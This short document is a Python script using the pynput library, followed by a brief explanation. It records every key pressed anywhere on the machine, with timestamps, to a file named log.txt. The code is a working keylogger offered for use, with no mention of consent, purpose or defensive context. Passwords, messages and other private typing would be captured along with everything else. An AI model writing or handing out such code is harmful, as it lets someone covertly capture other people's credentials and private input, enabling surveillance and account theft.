```python
import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Pressed key {str(key)}')
    except AttributeError:
        logging.error('Failed to log this key press due to an AttributeError')

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This code will log all keys pressed, including letters, numbers, and special keys, into a file named `log.txt`. The logging is set up to include timestamps for each key press event, making it easy to review the sequence of actions.